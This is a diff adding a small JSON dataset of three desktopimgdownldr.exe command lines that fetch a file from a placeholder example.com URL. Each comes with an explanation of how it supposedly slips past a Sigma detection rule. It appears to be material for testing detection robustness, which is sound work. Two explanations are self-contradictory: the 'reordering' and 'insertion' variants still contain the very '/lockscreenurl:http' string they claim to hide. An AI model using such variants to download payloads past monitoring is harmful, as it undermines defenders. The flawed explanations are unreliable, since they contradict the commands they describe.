@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Lab\\tools\\desktopimgdownldr.exe /lockscreenurl:http://example.com/test.jpg",
+    "explanation": "Reordering: The command line reorders the arguments to avoid the suspicious '/lockscreenurl:http' string matching the Sigma rule."
+  },
+  {
+    "output": "C:\\Lab\\tools\\desktopimgdownldr.exe -lockscreenurl http://example.com/test.jpg",
+    "explanation": "Substitution: Replaced '/lockscreenurl:http' with '-lockscreenurl http' to change the syntax while maintaining the same intent, potentially avoiding the Sigma rule's string match."
+  },
+  {
+    "output": "C:\\Lab\\tools\\desktopimgdownldr.exe /lockscreenurl:http://example.com/test.jpg -safe -test",
+    "explanation": "Insertion: Added harmless flags '-safe -test' to the command line, which may obscure the '/lockscreenurl:http' string from being detected by the Sigma rule."
+  }
+]
